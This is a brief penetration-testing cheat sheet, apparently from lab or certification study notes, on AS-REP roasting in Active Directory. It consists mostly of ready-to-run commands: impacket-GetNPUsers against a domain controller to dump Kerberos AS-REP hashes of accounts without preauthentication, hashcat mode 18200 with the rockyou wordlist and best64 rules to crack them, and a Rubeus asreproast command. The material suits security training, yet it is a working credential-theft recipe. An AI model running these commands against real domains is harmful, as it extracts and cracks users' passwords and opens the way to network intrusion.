#activedirectory #cracking #password 

🔴 To check the users who are vulnerable use below
1. Powerview Get-DomainUser function with the option -PreauthNotRequired
2. impacket-GetNPUsers as shown below without the -request and -outputfile options.
#### IMPACKET

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Cracking  the Hash

```bash
hashcat --help | grep -i "Kerberos"
```

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Rubeus

```cmd
.\Rubeus.exe asreproast /nowrap
```

